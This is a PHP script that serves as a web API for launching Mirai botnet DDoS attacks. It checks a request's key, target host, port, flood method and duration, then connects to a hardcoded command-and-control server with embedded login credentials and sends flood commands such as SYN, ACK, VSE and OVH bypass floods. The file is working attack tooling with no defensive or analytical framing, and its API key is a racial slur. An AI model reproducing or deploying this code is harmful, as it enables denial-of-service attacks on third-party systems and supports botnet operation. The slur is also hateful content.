<?php
error_reporting(E_ALL);
 
 
   
 
 //   * Usage: http://SERVERIP/Mirai.php?key=ipdowned&host=[host]&port=[port]&method=[method]&time=[time]


 
    $APIKeys = array("nigger");
 
 
 

 
    $attackMethods = array("UDP", "UDPPLAIN", "STD", "SYN", "ACK", "CFNULL", "VSE", "OVH-UDP");
 
 
 
    function htmlsc($string)
 
    {
 
        return htmlspecialchars($string, ENT_QUOTES, "UTF-8");
 
    }
 
 
 
    // Check if all parameters are passed
 
    if (!isset($_GET["key"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["method"]) || !isset($_GET["time"]))
 
        die("You are missing a parameter");
 
 
 
    // Variables for attack
 
    $key = htmlsc($_GET["key"]);
 
    $host = htmlsc($_GET["host"]);
 
    $port = htmlsc($_GET["port"]);
 
    $method = htmlsc(strtoupper($_GET["method"]));
 
    $time = htmlsc($_GET["time"]);
 
    $command = "";
 
 
 
    // Check if API key is valid
 
    if (!in_array($key, $APIKeys)) die("Invalid API key");
 
 
 
    // Check if attack method is valid
 
    if (!in_array($method, $attackMethods)) die("Invalid attack method");
 
 
 
    // Set command for method (should really use a switch() statement but who cares?)
 
 
    if ($method == "UDP") $command = " !stdflood $host $time dport=$port \r\n";
    
    else if ($method == "FRAG") $command = " !fragflood $host $time dport=$port\r\n";

    else if ($method == "SYN") $command = " !synflood $host $time dport=$port\r\n";
    
    else if ($method == "VSE") $command = " !vseflood $host $time dport=$port\r\n";

    else if ($method == "ACK") $command = " !ackflood $host $time dport=$port\r\n";
    
    else if ($method == "STOMP") $command = " !stompflood $host $time dport=$port\r\n";

    else if ($method == "OVH-UDP") $command = " !ovhbypass $host $time dport=$port\r\n";

  
    // Add other methods if you need them, I'm sure you're capable of doing that (I hope)
 
 
 
    // Connect
 
    $socket = fsockopen("85.31.46.23", "1312"); // Example: $socket = fsockopen("1.2.3.4", "23");
 
    ($socket ? null : die("Failed to connect"));
 
 
 
    // Login
 
    fwrite($socket, " \r\n"); // Leave This.
   
    sleep(1);
   
    fwrite($socket, "kaz\r\n"); // Username
   
    sleep(1);
   
    fwrite($socket, "kaz404405\r\n"); // Password
 
 
 
    // Send command
 
    sleep(1); // Why? I've noticed for some people it doesn't work w/o the sleep() (or anything before fwrite()ing $command)!
 
    fwrite($socket, $command);
 
 
 
    // Close connection
 
    fclose($socket);
 
    // Say the attack has been sent
 
    echo "ATTACKING $host:$port for $time seconds using method $method!\n";
 
   
?>